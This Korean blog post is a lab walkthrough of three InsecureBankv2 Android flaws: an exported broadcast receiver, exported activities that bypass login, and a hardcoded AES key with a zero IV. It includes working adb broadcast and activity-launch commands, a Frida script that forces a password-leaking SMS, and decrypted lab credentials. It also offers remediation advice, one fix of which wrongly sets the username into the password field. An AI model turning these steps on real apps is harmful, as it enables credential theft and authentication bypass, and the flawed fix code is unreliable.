---
title: 인시큐어뱅크 취약점 항목별 상세 실습(1~3)
date: 2026-01-06 00:01:01 +0800
category: MobileHacking
tags: [MobileHacking, Android, 인시큐어뱅크 실습]
#pin: true
---

>『안드로이드 모바일 앱 모의해킹』을 참고해 금융권 앱을 모델로 가상으로 제작된 ‘인시큐어뱅크’ 앱으로 취약점 항목별로 실습을 했습니다.

## 1. 브로드캐스트 리시버 결함
### 1.1 취약점 소개
- 브로드캐스트 리시버는 안드로이드 시스템의 중요한 요소 중 하나로, 안드로이드 디바이스에서 이벤트가 발생하면 브로드캐스트 신호를 보내게 되는데, 이 신호를 받아 처리하는 역할을 수행한다.
- 대상 애플리케이션에서 발생하는 브로드캐스트를 받기 위해서는 브로드캐스트 리시버가 설정되어 있어야 하며, 신호를 받는 경우 애플리케이션에 정의해 놓은 작업을 수행한다.
- 브로드캐스트 리시버는 `AndroidManifest.xml`의 `<receiver></receiver>` 항목에 선언된다.

- 애플리케이션에서 선언한 액션을 호출하면 리시버는 해당 액션을 인지하여 작업을 수행하게 하고, 여기서 수행하는 작업은 브로드캐스트 리시버를 상속 받은 매서드에서 처리한다.
- 브로드캐스트 리시버를 호출할 때 발생하는 브로드캐스트가 정상이면
	- 부팅 완료, 문자 메시지 송수신, 배터리 상태 등을 나타내는 시스템 이벤트와 다른 애플리케이션에서 발생하는 경우가 있다.
- 이와 반대로 비정상이면 
	- 악의적인 애플리케이션에서 발생하거나, 공격자에 의해 임의대로 생성할 수 있다.

- 공격자는 사용자가 받는 알림을 중간에서 가로채는 행위를 할 수 있으며, 특정한 상황에서만 발생하는 작업을 우회하여 수행하도록 조작할 수 있다.


### 1.2 진단
`AndroidManifest.xml` 에 선언된 리시버와 브로드캐스트 리시버를 상속 받는 메서드
```java
<receiver
	android:name="com.android.insecurebankv2.MyBroadCastReceiver"
	android:exported="true">     //<== 외부 애플리케이션으로부터 intent를 받을 수 있다.
	<intent-filter>
		<action android:name="theBroadcast"/>    //<== 브로드캐스트 이름
	</intent-filter>
</receiver>
```

`MyBroadCastReceiver`
```java
public class MyBroadCastReceiver extends BroadcastReceiver {  
    public static final String MYPREFS = "mySharedPreferences";  
    String usernameBase64ByteString;  
  
    @Override // android.content.BroadcastReceiver  
    public void onReceive(Context context, Intent intent) {  
        String phn = intent.getStringExtra("phonenumber");  
        String newpass = intent.getStringExtra("newpass");  
        
        if (phn != null) {  
            try {  
                SharedPreferences settings = context.getSharedPreferences("mySharedPreferences", 1);  
                String username = settings.getString("EncryptedUsername", null);  
                byte[] usernameBase64Byte = Base64.decode(username, 0);  
                this.usernameBase64ByteString = new String(usernameBase64Byte, "UTF-8");  
                String password = settings.getString("superSecurePassword", null);  
                CryptoClass crypt = new CryptoClass();  
                String decryptedPassword = crypt.aesDeccryptedString(password);  
                String textPhoneno = phn.toString();  
                String textMessage = "Updated Password from: " + decryptedPassword + " to: " + newpass;  
                SmsManager smsManager = SmsManager.getDefault();  
                System.out.println("For the changepassword - phonenumber: " + textPhoneno + " password is: " + textMessage);  
                smsManager.sendTextMessage(textPhoneno, null, textMessage, null, null);  
                return;
  
            } catch (Exception e) {  
                e.printStackTrace();  
                return;  
            }  
        }  
        System.out.println("Phone number is null");  
    }  
}
```

#### ADB를 이용한 브로드캐스트 생성
- ADB에서 임의의 브로드캐스트를 생성하여 브로드캐스트 리시버를 속이기 위해서는 `am` 명령을 사용함
	- `am`은 `액티비티 매니저`로, 안드로이드 시스템에 포함된 다양한 약션을 명령으로 수행할 수 있다. 
- 브로드캐스트를 생성하기 위해 먼저 대상 장치에 `adb shell` 명령으로 대상 장치의 프롬프트에 진입하고 다음 명령을 수행한다.

```
#브로드캐스트 생성
am broadcast -a theBroadcast -n com.android.insecurebankv2/.MyBroadCastReceiver
#logcat 확인
System.out: Phone number is null

#브로드캐스트에 매개변수 포함해서 전달
am broadcast -a theBroadcast -n com.android.insecurebankv2/.MyBroadCastReceiver --es phonenumber 5555 --es newpass test
#logcat 확인
System.out: For the changepassword - phonenumber: 5555 password is: Updated Password from: Dinesh@123$ to: test
```

#### Frida를 이용한 브로드캐스트 생성
```java
Java.perform(function () {
    // 1. 필요한 클래스 참조 가져오기
    var Intent = Java.use("android.content.Intent");
    var Context = Java.use("android.content.Context");
    
    // 2. 현재 실행 중인 앱의 Context(맥락/환경) 가져오기
    // (보통 ActivityThread를 통해 현재 앱의 Context를 얻어옵니다)
    var currentApplication = Java.use("android.app.ActivityThread").currentApplication();
    var context = currentApplication.getApplicationContext();

    console.log("[*] 브로드캐스트 전송 준비 중...");

    // 3. 새로운 Intent 객체 생성 (Action 이름 지정)
    var intent = Intent.$new("theBroadcast");

    // 4. 특정 컴포넌트(MyBroadCastReceiver)로 주소 지정
    intent.setClassName("com.android.insecurebankv2", "com.android.insecurebankv2.MyBroadCastReceiver");

    // 5. 데이터(Extra) 넣기 (명령어의 --es 역할)
    intent.putExtra("phonenumber", "1234");
    intent.putExtra("newpass", "frida_test");

    // 6. 브로드캐스트 전송!
    context.sendBroadcast(intent);

    console.log("[+] 브로드캐스트가 전송되었습니다: phonenumber=1234, newpass=frida_test");
});
```

### 취약점 대응 방안
결함을 다음과 같이 수정해야 합니다.

1. **`android:exported="false"` 설정**: `AndroidManifest.xml`에서 이 리시버를 앱 내부에서만 사용할 수 있도록 비공개 처리합니다.    
2. **권한(Permission) 설정**: 특정 권한을 가진 앱만 이 방송을 보낼 수 있도록 제한합니다.    
3. **LocalBroadcastManager 사용**: 앱 내부 통신용으로만 방송을 제한하여 외부 공격자가 아예 접근하지 못하게 차단합니다.    
4. **민감 정보 전송 금지**: 비밀번호 같은 민감한 정보는 절대로 SMS 같은 평문 채널로 내보내지 않습니다.

<br><br>

---

## 2. 취약한 인증 메커니즘
### 2.1 취약점 소개
- 취약한 인증 메커니즘은 정상 인증 절차를 우회하여 비정상적인 인증으로 접근 권한을 취득하는 취약점
	- 적절하지 않은 앱 퍼미션 설정 여부
	- 서비스 권한 상승 행위에 대한 통제 여부
	- 기능에 대한 제한 또는 우회 금지 여부
	- 불필요하거나 사용하지 않는 액티비티 제거 여부
	- 인텐트 사용에 대한 안정성 여부
	- 마스터 키 취약점 대응 여부
- 인시큐어뱅크에는 액티비티 속성으로 로그인 인증 없이 권한 우회가 가능함
### 2.2 취약점 진단 과정
`AndroidManifest.xml`

```java
<activity
	android:label="@string/title_activity_file_pref"
	android:name="com.android.insecurebankv2.FilePrefActivity"
	android:windowSoftInputMode="adjustNothing|stateVisible"/>
<activity
	android:label="@string/title_activity_do_login"
	android:name="com.android.insecurebankv2.DoLogin"/>
<activity
	android:label="@string/title_activity_post_login"
	android:name="com.android.insecurebankv2.PostLogin"
	android:exported="true"/>
<activity
	android:label="@string/title_activity_wrong_login"
	android:name="com.android.insecurebankv2.WrongLogin"/>
<activity
	android:label="@string/title_activity_do_transfer"
	android:name="com.android.insecurebankv2.DoTransfer"
	android:exported="true"/>
<activity
	android:label="@string/title_activity_view_statement"
	android:name="com.android.insecurebankv2.ViewStatement"
	android:exported="true"/>
```
- `AndroidManifest.xml`의 액티비티 속성이 `android:exported="true"`로 설정되어 있다.
	- 이 경우 다른 액티비티에서 인증 없이 접근할 수 있다.
- 안드로이드 앱의 구성 요소(Activity, Service, Receiver 등)는 기본적으로 외부 접근이 제한될 수 있다.
	- `true`일 때: 해당 앱뿐만 아니라, **기기에 설치된 다른 모든 앱**이 이 액티비티의 이름을 알고 있다면 `Intent`를 보내서 강제로 화면을 띄울 수 있다.    
	- `false`일 때: 해당 앱 내부 혹은 같은 사용자 ID(UID)를 사용하는 앱에서만 이 액티비티를 실행할 수 있다. 외부 앱이 접근하려고 하면 `SecurityException`이 발생하며 차단된다.

```bash
adb shell am start com.android.insecurebankv2/com.android.insecurebankv2.PostLogin
adb shell am start com.android.insecurebankv2/com.android.insecurebankv2.Dotransfer
adb shell am start com.android.insecurebankv2/com.android.insecurebankv2.WrongLogin
```


### 2.3 취약점 대응 방안
- 컴포넌트에 대한 접근은 외부에 허락하지 않는 것이 안전하다.
- 특별한 경우가 아니라면 액티비티 속성은 `android:exported="false"` 로 설정하고, `true` 로 설정할 경우 별도의 인텐트 필터로 검증한다.

<br><br>

---

## 3. 로컬 암호화 이슈
### 3.1 취약점 소개
- 안드로이드 애플리케이션은 실행되는 도중에 특정 정보들을 저장해야 할 때가 있다.
- 중요한 정보를 저장해야 할 경우에는 어떠한 방법으로 저장해야 할 것인지 정해야한다. (대칭키, 공개키)
- 만약 평문으로 저장하면 공격자에게 누출될 수 있다.

### 3.2 취약점 진단 과정

![Desktop View](../assets/img/insecurebank실습\3.2로그인화면.png){: .w-25 .right}
- 인시큐어뱅크의 로그인 화면에서 `Autofill Credentials` 버튼을 누르면 마지막으로 로그인했던 아이디와 비밀번호를 자동으로 불러와 로그인할 수 있다.

- 자동으로 불러온 계정 정보는 앱의 내부에 저장되어 있을 것이다.
- 이 정보를 찾기 위해 앱의 데이터가 저장되는 곳으로 이동해본다.

![Desktop View](../assets/img/insecurebank실습\3.2진단.png){: width=500 }

- `mySharedPreferences.xml` 파일과 `com.android.insecurebankv2_preferences.xml` 파일이 있다.


>cat mySharedPreferences.xml

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="EncryptedUsername">ZGluZXNo&#13;&#10;    </string>
    <string name="superSecurePassword">DTrW2VXjSoFdg0e61fHxJg==&#10;    </string>
</map>
```

>cat com.android.insecurebankv2_preferences.xml         

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="serverport">8888</string>
    <string name="serverip">10.0.2.2</string>
</map>
```

- `SharedPreferences`는 초기 설정값, 자동 로그인 등 간단한 환경 변수를 애플리케이션의 저장 공간 안에 파일 형태로 저장한다. 또한 별도로 삭제하지 않는 이상 재부팅되더라도 값은 유지되는 특징을 갖는다.
- `SharedPreferences`를 편집하기 위해서는 반드시 `SharedPreferences.Editer`인터페이스에 포함되어 있는 메서드를 사용해야한다. (putstring, commit 등)

- 아이디, 비밀번호가 저장되는 부분은 아래와 같다

`DoLogin 클래스`
```java
private void saveCreds(String username, String password) {  
		SharedPreferences mySharedPreferences = DoLogin.this.getSharedPreferences("mySharedPreferences", 0);  
		SharedPreferences.Editor editor = mySharedPreferences.edit();  
		DoLogin.this.rememberme_username = username;
		DoLogin.this.rememberme_password = password;  
		String base64Username = new String(Base64.encodeToString(DoLogin.this.rememberme_username.getBytes(), 4));  
		CryptoClass crypt = new CryptoClass();  
		DoLogin.this.superSecurePassword = crypt.aesEncryptedString(DoLogin.this.rememberme_password);  
		editor.putString("EncryptedUsername", base64Username);  
		editor.putString("superSecurePassword", DoLogin.this.superSecurePassword);  
		editor.commit();  
	}
```
- 내용을 보면 로그인한 사용자의 아이디와 비밀번호를 암호화하여 `mySharedPreferences.xml` 파일에 저장한다.
- 아이디는 base64인코딩, 비밀번호는 AES(대칭키)로 암호화되어 저장되는걸 알 수 있다.

`CryptoClass`
```java
String key = "This is the super secret key 123";
byte[] ivBytes = {0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0};

public static byte[] aes256encrypt(byte[] ivBytes, byte[] keyBytes, byte[] textBytes)
public static byte[] aes256decrypt(byte[] ivBytes, byte[] keyBytes, byte[] textBytes)
public String aesDeccryptedString(String theString)
public String aesEncryptedString(String theString)
```
- 로그인할 때 사용자가 입력한 비밀번호를 `aesDeccryptedString` 함수의 전달 인자로 받는다.
- 위에서 하드코딩된 대칭키값을 가져와 keyByte배열 변수에 저장한 후 `aes256encrypt` 함수로 암호화한다.
- 리턴 받은 값이 `mySharedPreferences.xml`에 저장된다.
- 앞에서 확인한 `DTrW2VXjSoFdg0e61fHxJg==` 값이 "This is the super secret key 123" 이라는 키값으로 AES 암호화된 값이다.
- IV(초기화 벡터)가 모두 0이기 때문에 key를 알면 쉽게 복호화가 가능하다.

>아이디: dinesh

![Desktop View](../assets/img/insecurebank실습\3.2Base64디코딩.png){: width="500" }

> 비밀번호: Dinesh@123$

![Desktop View](../assets/img/insecurebank실습\3.2AES복호화.png){: width="500" }


### 3.3 취약점 대응 방안
- 가장 문제가 되었던 점은 사용자의 아이디가 Base64 인코딩을 통해 저장되어 있다는 점이다.
	- 인코딩은 암호화 개념이 아니라 디코딩이 쉽다. 비밀번호 암호화하는 데 사용되었던 AES 암호화를 적용해야 한다.
- KISA "**암호 알고리즘 및 키 길이 이용 안내서**"에 따르면 AES-256은 강력한 암호화 방법이다.
	- 하지만 대칭키를 사용해 암호화하는 알고리즘에서 고유키가 제대로 보호하지 못하면 아무리 강력한 암호화 방법을 사용하더라도 데이터를 안전하게 보관하지 못한다.
- 키를 관리하는 서버를 별도로 두고, 키는 주기적으로 바꿔줘야 한다.
	- 키를 주기적으로 변경하더라도 최소한의 인원만 키에 대한 정보를 알고 있어야 한다.
- 이밖에 키를 암호화하여 파일 시스템에서 관리하는 방법도 있다. 
	- 이 경우에는 공격자가 프로세스가 동작하는 도중, 메모리 덤프 등을 통해 키를 추출할 수도 있다는 점에 주의해야 한다.
- 마지막으로 암호화된 키가 **평문으로 저장**되어 있기 때문에 소스 코드가 노출될 경우 키값 역시 그대로 노출될 수 있는 위험성이 있고, 이를 예방하기 위해서는 반드시 **소스 코드 난독화**와 **바이너리 무결성**을 검증해야한다.

`DoLogin` 클래스
```java
private void saveCreds(String username, String password) {  
		SharedPreferences mySharedPreferences = DoLogin.this.getSharedPreferences("mySharedPreferences", 0);
		SharedPreferences.Editor editor = mySharedPreferences.edit();
		DoLogin.this.rememberme_username = username;
		DoLogin.this.rememberme_password = password;
		//삭제
		//String base64Username = new String(Base64.encodeToString(DoLogin.this.rememberme_username.getBytes(), 4));
		CryptoClass crypt = new CryptoClass();
		
		//추가
		String encrytedUsername = crypt.aesEncryptedString(rememberme_username);
		DoLogin.this.superSecurePassword = crypt.aesEncryptedString(rememberme_password);
		
		//수정
		editor.putString("EncryptedUsername", encrytedUsername);
		editor.putString("superSecurePassword", DoLogin.this.superSecurePassword);
		editor.commit();
	}
```
`LoginActivity` 클래스
```java
protected void fillData() {
...
		this.Username_Text = (EditText) findViewById(R.id.loginscreen_username);
		this.Password_Text = (EditText) findViewById(R.id.loginscreen_password);
		//삭제
		//this.Username_Text.setText(this.usernameBase64ByteString);
		
		CryptoClass crypt = new CryptoClass();
		// 추가
		String decryptedUsername = crypt.aesDeccryptedString(username);
		this.Password_Text.setText(decryptedUsername);
		
		String decryptedPassword = crypt.aesDeccryptedString(password);
		this.Password_Text.setText(decryptedPassword);
		return;
	}
```

## 참고
『안드로이드 모바일 앱 모의해킹』(조정원)